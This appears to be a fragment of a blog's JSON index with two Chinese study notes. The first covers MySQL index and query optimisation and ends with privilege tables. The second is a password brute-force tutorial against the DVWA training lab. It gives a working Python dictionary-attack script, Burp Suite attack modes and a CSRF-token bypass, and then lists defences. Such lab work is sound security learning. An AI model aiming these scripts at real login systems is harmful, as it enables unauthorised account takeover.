*，容易出现回表查询，降低效率，除非有联合索引包含了所有字段\n面试题：一张表，有四个字段（id, username, password, status），由于数据量大，需要对以下SQL语句进行优化，该如何进行才是最优方案：select id, username, password from tb_user where username=&#39;itcast&#39;;\n解：给username和password字段建立联合索引，则不需要回表查询，直接覆盖索引\n前缀索引当字段类型为字符串（varchar, text等）时，有时候需要索引很长的字符串，这会让索引变得很大，查询时，浪费大量的磁盘IO，影响查询效率，此时可以只降字符串的一部分前缀，建立索引，这样可以大大节约索引空间，从而提高索引效率。\n语法：create index idx_xxxx on table_name(columnn(n));前缀长度：可以根据索引的选择性来决定，而选择性是指不重复的索引值（基数）和数据表的记录总数的比值，索引选择性越高则查询效率越高，唯一索引的选择性是1，这是最好的索引选择性，性能也是最好的。求选择性公式：\nselect count(distinct email) &#x2F; count(*) from tb_user;\nselect count(distinct substring(email, 1, 5)) &#x2F; count(*) from tb_user;\n\nshow index 里面的sub_part可以看到接取的长度\n单列索引&amp;联合索引单列索引：即一个索引只包含单个列联合索引：即一个索引包含了多个列在业务场景中，如果存在多个查询条件，考虑针对于查询字段建立索引时，建议建立联合索引，而非单列索引。\n单列索引情况：explain select id, phone, name from tb_user where phone = &#39;17799990010&#39; and name = &#39;韩信&#39;;这句只会用到phone索引字段\n注意事项\n多条件联合查询时，MySQL优化器会评估哪个字段的索引效率更高，会选择该索引完成本次查询\n\n设计原则\n针对于数据量较大，且查询比较频繁的表建立索引\n针对于常作为查询条件（where）、排序（order by）、分组（group by）操作的字段建立索引\n尽量选择区分度高的列作为索引，尽量建立唯一索引，区分度越高，使用索引的效率越高\n如果是字符串类型的字段，字段长度较长，可以针对于字段的特点，建立前缀索引\n尽量使用联合索引，减少单列索引，查询时，联合索引很多时候可以覆盖索引，节省存储空间，避免回表，提高查询效率\n要控制索引的数量，索引并不是多多益善，索引越多，维护索引结构的代价就越大，会影响增删改的效率\n如果索引列不能存储NULL值，请在创建表时使用NOT NULL约束它。当优化器知道每列是否包含NULL值时，它可以更好地确定哪个索引最有效地用于查询\n\nSQL 优化插入数据普通插入：\n\n采用批量插入（一次插入的数据不建议超过1000条）\n手动提交事务\n主键顺序插入\n\n大批量插入：如果一次性需要插入大批量数据，使用insert语句插入性能较低，此时可以使用MySQL数据库提供的load指令插入。\n# 客户端连接服务端时，加上参数 --local-infile（这一行在bash&#x2F;cmd界面输入）\nmysql --local-infile -u root -p\n# 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关\nset global local_infile &#x3D; 1;\nselect @@local_infile;\n# 执行load指令将准备好的数据，加载到表结构中\nload data local infile &#39;&#x2F;root&#x2F;sql1.log&#39; into table &#39;tb_user&#39; fields terminated by &#39;,&#39; lines terminated by &#39;\\n&#39;;\n\n主键优化数据组织方式：在InnoDB存储引擎中，表数据都是根据主键顺序组织存放的，这种存储方式的表称为索引组织表（Index organized table, IOT）\n页分裂：页可以为空，也可以填充一般，也可以填充100%，每个页包含了2-N行数据（如果一行数据过大，会行溢出），根据主键排列。页合并：当删除一行记录时，实际上记录并没有被物理删除，只是记录被标记（flaged）为删除并且它的空间变得允许被其他记录声明使用。当页中删除的记录到达 MERGE_THRESHOLD（默认为页的50%），InnoDB会开始寻找最靠近的页（前后）看看是否可以将这两个页合并以优化空间使用。\nMERGE_THRESHOLD：合并页的阈值，可以自己设置，在创建表或创建索引时指定\n\n\n\n\n\n\n\n\n\n文字说明不够清晰明了，具体可以看视频里的PPT演示过程：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=90\n主键设计原则：\n\n满足业务需求的情况下，尽量降低主键的长度\n插入数据时，尽量选择顺序插入，选择使用 AUTO_INCREMENT 自增主键\n尽量不要使用 UUID 做主键或者是其他的自然主键，如身份证号\n业务操作时，避免对主键的修改\n\norder by优化\nUsing filesort：通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区 sort buffer 中完成排序操作，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序\nUsing index：通过有序索引顺序扫描直接返回有序数据，这种情况即为 using index，不需要额外排序，操作效率高\n\n如果order by字段全部使用升序排序或者降序排序，则都会走索引，但是如果一个字段升序排序，另一个字段降序排序，则不会走索引，explain的extra信息显示的是Using index, Using filesort，如果要优化掉Using filesort，则需要另外再创建一个索引，如：create index idx_user_age_phone_ad on tb_user(age asc, phone desc);，此时使用select id, age, phone from tb_user order by age asc, phone desc;会全部走索引\n总结：\n\n根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则\n尽量使用覆盖索引\n多字段排序，一个升序一个降序，此时需要注意联合索引在创建时的规则（ASC&#x2F;DESC）\n如果不可避免出现filesort，大数据量排序时，可以适当增大排序缓冲区大小 sort_buffer_size（默认256k）\n\ngroup by优化\n在分组操作时，可以通过索引来提高效率\n分组操作时，索引的使用也是满足最左前缀法则的\n\n如索引为idx_user_pro_age_stat，则句式可以是select ... where profession order by age，这样也符合最左前缀法则\nlimit优化常见的问题如limit 2000000, 10，此时需要 MySQL 排序前2000000条记录，但仅仅返回2000000 - 2000010的记录，其他记录丢弃，查询排序的代价非常大。优化方案：一般分页查询时，通过创建覆盖索引能够比较好地提高性能，可以通过覆盖索引加子查询形式进行优化\n例如：\n-- 此语句耗时很长\nselect * from tb_sku limit 9000000, 10;\n-- 通过覆盖索引加快速度，直接通过主键索引进行排序及查询\nselect id from tb_sku order by id limit 9000000, 10;\n-- 下面的语句是错误的，因为 MySQL 不支持 in 里面使用 limit\n-- select * from tb_sku where id in (select id from tb_sku order by id limit 9000000, 10);\n-- 通过连表查询即可实现第一句的效果，并且能达到第二句的速度\nselect * from tb_sku as s, (select id from tb_sku order by id limit 9000000, 10) as a where s.id &#x3D; a.id;\n\ncount优化MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高（前提是不适用where）；InnoDB 在执行 count(*) 时，需要把数据一行一行地从引擎里面读出来，然后累计计数。优化方案：自己计数，如创建key-value表存储在内存或硬盘，或者是用redis\ncount的几种用法：\n\n如果count函数的参数（count里面写的那个字段）不是NULL（字段值不为NULL），累计值就加一，最后返回累计值\n用法：count(*)、count(主键)、count(字段)、count(1)\ncount(主键)跟count(*)一样，因为主键不能为空；count(字段)只计算字段值不为NULL的行；count(1)引擎会为每行添加一个1，然后就count这个1，返回结果也跟count(*)一样；count(null)返回0\n\n各种用法的性能：\n\ncount(主键)：InnoDB引擎会遍历整张表，把每行的主键id值都取出来，返回给服务层，服务层拿到主键后，直接按行进行累加（主键不可能为空）\ncount(字段)：没有not null约束的话，InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，服务层判断是否为null，不为null，计数累加；有not null约束的话，InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，直接按行进行累加\ncount(1)：InnoDB 引擎遍历整张表，但不取值。服务层对于返回的每一层，放一个数字 1 进去，直接按行进行累加\ncount(*)：InnoDB 引擎并不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行进行累加\n\n按效率排序：count(字段) &lt; count(主键) &lt; count(1) &lt; count(*)，所以尽量使用 count(*)\nupdate优化（避免行锁升级为表锁）InnoDB 的行锁是针对索引加的锁，不是针对记录加的锁，并且该索引不能失效，否则会从行锁升级为表锁。\n如以下两条语句：update student set no = &#39;123&#39; where id = 1;，这句由于id有主键索引，所以只会锁这一行；update student set no = &#39;123&#39; where name = &#39;test&#39;;，这句由于name没有索引，所以会把整张表都锁住进行数据更新，解决方法是给name字段添加索引\n数据类型整型\n\n\n类型名称\n取值范围\n大小\n\n\n\nTINYINT\n-128〜127\n1个字节\n\n\nSMALLINT\n-32768〜32767\n2个宇节\n\n\nMEDIUMINT\n-8388608〜8388607\n3个字节\n\n\nINT (INTEGHR)\n-2147483648〜2147483647\n4个字节\n\n\nBIGINT\n-9223372036854775808〜9223372036854775807\n8个字节\n\n\n无符号在数据类型后加 unsigned 关键字。\n浮点型\n\n\n类型名称\n说明\n存储需求\n\n\n\nFLOAT\n单精度浮点数\n4 个字节\n\n\nDOUBLE\n双精度浮点数\n8 个字节\n\n\nDECIMAL (M, D)，DEC\n压缩的“严格”定点数\nM+2 个字节\n\n\n日期和时间\n\n\n类型名称\n日期格式\n日期范围\n存储需求\n\n\n\nYEAR\nYYYY\n1901 ~ 2155\n1 个字节\n\n\nTIME\nHH:MM:SS\n-838:59:59 ~ 838:59:59\n3 个字节\n\n\nDATE\nYYYY-MM-DD\n1000-01-01 ~ 9999-12-3\n3 个字节\n\n\nDATETIME\nYYYY-MM-DD HH:MM:SS\n1000-01-01 00:00:00 ~ 9999-12-31 23:59:59\n8 个字节\n\n\nTIMESTAMP\nYYYY-MM-DD HH:MM:SS\n1980-01-01 00:00:01 UTC ~ 2040-01-19 03:14:07 UTC\n4 个字节\n\n\n字符串\n\n\n类型名称\n说明\n存储需求\n\n\n\nCHAR(M)\n固定长度非二进制字符串\nM 字节，1&lt;&#x3D;M&lt;&#x3D;255\n\n\nVARCHAR(M)\n变长非二进制字符串\nL+1字节，在此，L&lt; &#x3D; M和 1&lt;&#x3D;M&lt;&#x3D;255\n\n\nTINYTEXT\n非常小的非二进制字符串\nL+1字节，在此，L&lt;2^8\n\n\nTEXT\n小的非二进制字符串\nL+2字节，在此，L&lt;2^16\n\n\nMEDIUMTEXT\n中等大小的非二进制字符串\nL+3字节，在此，L&lt;2^24\n\n\nLONGTEXT\n大的非二进制字符串\nL+4字节，在此，L&lt;2^32\n\n\nENUM\n枚举类型，只能有一个枚举字符串值\n1或2个字节，取决于枚举值的数目 (最大值为65535)\n\n\nSET\n一个设置，字符串对象可以有零个或 多个SET成员\n1、2、3、4或8个字节，取决于集合 成员的数量（最多64个成员）\n\n\n二进制类型\n\n\n类型名称\n说明\n存储需求\n\n\n\nBIT(M)\n位字段类型\n大约 (M+7)&#x2F;8 字节\n\n\nBINARY(M)\n固定长度二进制字符串\nM 字节\n\n\nVARBINARY (M)\n可变长度二进制字符串\nM+1 字节\n\n\nTINYBLOB (M)\n非常小的BLOB\nL+1 字节，在此，L&lt;2^8\n\n\nBLOB (M)\n小 BLOB\nL+2 字节，在此，L&lt;2^16\n\n\nMEDIUMBLOB (M)\n中等大小的BLOB\nL+3 字节，在此，L&lt;2^24\n\n\nLONGBLOB (M)\n非常大的BLOB\nL+4 字节，在此，L&lt;2^32\n\n\n权限一览表\n\n\n\n\n\n\n\n\n具体权限的作用详见官方文档\nGRANT 和 REVOKE 允许的静态权限\n\n\n\nPrivilege\nGrant Table Column\nContext\n\n\n\nALL [PRIVILEGES]\nSynonym for “all privileges”\nServer administration\n\n\nALTER\nAlter_priv\nTables\n\n\nALTER ROUTINE\nAlter_routine_priv\nStored routines\n\n\nCREATE\nCreate_priv\nDatabases, tables, or indexes\n\n\nCREATE ROLE\nCreate_role_priv\nServer administration\n\n\nCREATE ROUTINE\nCreate_routine_priv\nStored routines\n\n\nCREATE TABLESPACE\nCreate_tablespace_priv\nServer administration\n\n\nCREATE TEMPORARY TABLES\nCreate_tmp_table_priv\nTables\n\n\nCREATE USER\nCreate_user_priv\nServer administration\n\n\nCREATE VIEW\nCreate_view_priv\nViews\n\n\nDELETE\nDelete_priv\nTables\n\n\nDROP\nDrop_priv\nDatabases, tables, or views\n\n\nDROP ROLE\nDrop_role_priv\nServer administration\n\n\nEVENT\nEvent_priv\nDatabases\n\n\nEXECUTE\nExecute_priv\nStored routines\n\n\nFILE\nFile_priv\nFile access on server host\n\n\nGRANT OPTION\nGrant_priv\nDatabases, tables, or stored routines\n\n\nINDEX\nIndex_priv\nTables\n\n\nINSERT\nInsert_priv\nTables or columns\n\n\nLOCK TABLES\nLock_tables_priv\nDatabases\n\n\nPROCESS\nProcess_priv\nServer administration\n\n\nPROXY\nSee proxies_priv table\nServer administration\n\n\nREFERENCES\nReferences_priv\nDatabases or tables\n\n\nRELOAD\nReload_priv\nServer administration\n\n\nREPLICATION CLIENT\nRepl_client_priv\nServer administration\n\n\nREPLICATION SLAVE\nRepl_slave_priv\nServer administration\n\n\nSELECT\nSelect_priv\nTables or columns\n\n\nSHOW DATABASES\nShow_db_priv\nServer administration\n\n\nSHOW VIEW\nShow_view_priv\nViews\n\n\nSHUTDOWN\nShutdown_priv\nServer administration\n\n\nSUPER\nSuper_priv\nServer administration\n\n\nTRIGGER\nTrigger_priv\nTables\n\n\nUPDATE\nUpdate_priv\nTables or columns\n\n\nUSAGE\nSynonym for “no privileges”\nServer administration\n\n\nGRANT 和 REVOKE 允许的动态权限\n\n\n\nPrivilege\nContext\n\n\n\nAPPLICATION_PASSWORD_ADMIN\nDual password administration\n\n\nAUDIT_ABORT_EXEMPT\nAllow queries blocked by audit log filter\n\n\nAUDIT_ADMIN\nAudit log administration\n\n\nAUTHENTICATION_POLICY_ADMIN\nAuthentication administration\n\n\nBACKUP_ADMIN\nBackup administration\n\n\nBINLOG_ADMIN\nBackup and Replication administration\n\n\nBINLOG_ENCRYPTION_ADMIN\nBackup and Replication administration\n\n\nCLONE_ADMIN\nClone administration\n\n\nCONNECTION_ADMIN\nServer administration\n\n\nENCRYPTION_KEY_ADMIN\nServer administration\n\n\nFIREWALL_ADMIN\nFirewall administration\n\n\nFIREWALL_EXEMPT\nFirewall administration\n\n\nFIREWALL_USER\nFirewall administration\n\n\nFLUSH_OPTIMIZER_COSTS\nServer administration\n\n\nFLUSH_STATUS\nServer administration\n\n\nFLUSH_TABLES\nServer administration\n\n\nFLUSH_USER_RESOURCES\nServer administration\n\n\nGROUP_REPLICATION_ADMIN\nReplication administration\n\n\nGROUP_REPLICATION_STREAM\nReplication administration\n\n\nINNODB_REDO_LOG_ARCHIVE\nRedo log archiving administration\n\n\nNDB_STORED_USER\nNDB Cluster\n\n\nPASSWORDLESS_USER_ADMIN\nAuthentication administration\n\n\nPERSIST_RO_VARIABLES_ADMIN\nServer administration\n\n\nREPLICATION_APPLIER\nPRIVILEGE_CHECKS_USER for a replication channel\n\n\nREPLICATION_SLAVE_ADMIN\nReplication administration\n\n\nRESOURCE_GROUP_ADMIN\nResource group administration\n\n\nRESOURCE_GROUP_USER\nResource group administration\n\n\nROLE_ADMIN\nServer administration\n\n\nSESSION_VARIABLES_ADMIN\nServer administration\n\n\nSET_USER_ID\nServer administration\n\n\nSHOW_ROUTINE\nServer administration\n\n\nSYSTEM_USER\nServer administration\n\n\nSYSTEM_VARIABLES_ADMIN\nServer administration\n\n\nTABLE_ENCRYPTION_ADMIN\nServer administration\n\n\nVERSION_TOKEN_ADMIN\nServer administration\n\n\nXA_RECOVER_ADMIN\nServer administration\n\n\n图形化界面工具\nWorkbench(免费): http://dev.mysql.com/downloads/workbench/\nnavicat(收费，试用版30天): https://www.navicat.com/en/download/navicat-for-mysql\nSequel Pro(开源免费，仅支持Mac OS): http://www.sequelpro.com/\nHeidiSQL(免费): http://www.heidisql.com/\nphpMyAdmin(免费): https://www.phpmyadmin.net/\nSQLyog: https://sqlyog.en.softonic.com/\n\n安装小技巧\n在SQL语句之后加上\\G会将结果的表格形式转换成行文本形式\n查看Mysql数据库占用空间：SELECT table_schema &quot;Database Name&quot;\n     , SUM(data_length + index_length) &#x2F; (1024 * 1024) &quot;Database Size in MB&quot;\nFROM information_schema.TABLES\nGROUP BY table_schema;\n\n后续内容后续内容因为跟当前学习、工作计划有冲突，所以后续课程的学习计划会无限期推后。目前的工作重点放在重做一个学习笔记网站，当然这是边做边学的，开发过程中遇到的难点和知识点我也会记录下来供大家学习。在此感谢B站同样爱学习的同学 @守心-人 提供的后续课程笔记，大家有条件一定要去给个star，你的每一个star和点赞都是我们前进的动力https://github.com/Buildings-Lei/mysql_note&#x2F;blob&#x2F;main&#x2F;README.md\n\n\n\n\n\n\n\n\n\n在线笔记都是引用别人的笔记，保存下来方便自己学习，如有侵权请联系我删除\n原出处:https://dhc.pythonanywhere.com/entry/share/?key=3ad29aad765a2b98b2b2a745d71bef715507ee9db8adbec98257bac0ad84cbe4\n","slug":"MySQL2","date":"2023-01-10T13:21:22.691Z","categories_index":"在线笔记","tags_index":"数据库安全","author_index":"Abyssaler"},{"id":"768203e0c226cf15b0e3763fb1a90bc7","title":"暴力破解思路","content":"WEB漏洞：暴力破解密码爆破的本质：依赖字典，连续性的，自动化的尝试密码登陆爆破\n1）密码爆破思路方式一：尝试爆破：假设密码长度6，每位有126种可能。那么需要尝试126^6次。\n\n方式二：使用字典​     思考：字典从何而来？ \n参考泄露出来的最长使用的密码排名前200：\nhttps:&#x2F;&#x2F;nordpass.com&#x2F;most-common-passwords-list&#x2F;\n网络下载密码本\n密码生成器\n\n\n​      \n方式三：使用POC实现爆破POC实现爆破，python代码实现爆破：\n1、读取字典，加载密码\n2、发起http连接\n3、分析HTTP响应\n4、持续自动化爆破\n\n代码：\nreadpass.py\n# -*- coding: utf-8 -*-\n# python 3\n\npwds &#x3D; open(&quot;password.txt&quot;)\nfor pwd in pwds:\n    print(pwd)\n\npwds.close()\n\nhttpconn.py\n# -*- coding: utf-8 -*-\n# python 3\n\nimport requests\n\npwds &#x3D; open(&quot;password.txt&quot;)\nfor pwd in pwds:\n    url &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;brute&#x2F;&quot;\n    # PHPSESSID务必替换为登录以后的PHPSESSID\n    resp &#x3D; requests.get(url &#x3D; url, params &#x3D; &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:pwd.strip(), &quot;Login&quot;:&quot;Login&quot;&#125;, headers &#x3D; &#123;&quot;Cookie&quot;:&quot;security&#x3D;low; PHPSESSID&#x3D;0hhidoi7h1ln7jo9h2h0tgfnn6&quot;&#125;)\n    #print(resp.text)\n    if &#39;Username and&#x2F;or password incorrect.&#39; in resp.text:\n        print(&#39;破解失败：&#39;+pwd, end&#x3D;&#39;&#39;)\n    else:\n        print(&#39;破解成功：&#39;+pwd, end&#x3D;&#39;&#39;)\n        break;\npwds.close()\n\n2） DVWA靶场环境准备：下载代码： https://dvwa.co.uk/\n配置数据库：修改config&#x2F;config.inc.php\n部署到phpstudy\n注意是登录以后才可以使用暴破场景，而不是暴破首页的登录功能\n3）暴力破解实现使用python代码破解DVWA靶场使用工具BP实现爆破4）BP的攻击模式攻击模式一：狙击手\n发起爆破：\n\n攻击结果：\n\n攻击模式二：攻城锤Battering ram\n\n攻城锤模式，使用一个字典，两个节点的值一样：\n\n攻击模式三：草叉模式Pitchfork\n选择两个字典：\n\n\n攻击结果：一共发起10次请求，每一次请求使用第一个字典的第一个值和第二个字典的第一个值匹配，依次类推：\n\n攻击模式四：集束炸弹Cluster bomb\n使用两个字典：\n\n\n攻击结果：笛卡尔积，一共发起100次请求，爆破成功：\n\n5）防御DVWA-medium  ：sleep两秒\nDVWA-high: 随机sleep 0-3秒   ，  增加CSRF token（客户端请求伪造token）\nBP拦截：\n\n选择草叉模式：\n\n加载第一个字典：\n\n第二个参数，是需要从上一次请求中的token种得到：\n设置Options：匹配到前后的正则表达式，那么就是token：\n\n设置payloads：\n\n设置单线程：\n\n爆破结果：\n\n添加提示：\n\n点击Add：\n\n爆破结果：\n\nDvwa-impossible：限定次数：输错三次，锁定15分钟\n支付宝设置的防御机制：\n\n二次验证加固：\n\n人机识别加固：\n\n\n","slug":"暴力破解","date":"2022-11-11T01:21:04.000Z","categories_index":"学习笔记","tags_index":"漏洞","author_index":"Abyssaler"}]